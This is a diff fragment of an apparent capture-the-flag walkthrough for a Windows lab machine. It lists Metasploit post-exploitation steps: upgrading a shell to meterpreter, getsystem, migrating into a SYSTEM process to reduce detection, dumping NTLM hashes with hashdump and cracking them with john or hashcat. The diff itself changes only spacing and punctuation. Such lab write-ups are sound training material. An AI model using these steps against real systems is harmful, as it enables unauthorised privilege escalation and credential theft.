@@ -11,11 +11,11 @@
    2. Background session by pressing ctrl+z
 3. **Escalate**:
    1. Convert shell to meterpreter: use post/multi/manage/shell\_to\_meterpreter , SET LHOST to attacker ip and SESSION (backgrounded session id , use sessions -l to list sessions).
-   2. Execute **run**  to get meterpreter session and run `sessions -i MeterpreterSessionId` to switch to meterpreter session. Run `getsystem` to verify we got system access and are NT AUTHORITY\SYSTEM indeed.
+   2. Execute **run** to get meterpreter session and run `sessions -i MeterpreterSessionId` to switch to meterpreter session. Run `getsystem` to verify we got system access and are NT AUTHORITY\SYSTEM indeed.
    3. Use `ps` to list all process, migrate to any process running as system using `migrate pid` , we are injecting our meterpreter in running process to get stable and make our shell less detective.
 4. **Cracking**:
    1. type `hashdump` in meterpreter session and obtain NTLM credential hash dump.
    2. Use [crackstation](https://crackstation.net), john or hashcat to get password of Jon.
 5. **Find flags!**:
    1. run `search -f flag*` in meterpreter session, you will find location of flags.
-   2. Do `cat location_of_flag` for all 3 flag locations and submit the flags !!!
+   2. Do `cat location_of_flag` for all 3 flag locations and submit the flags !!! .
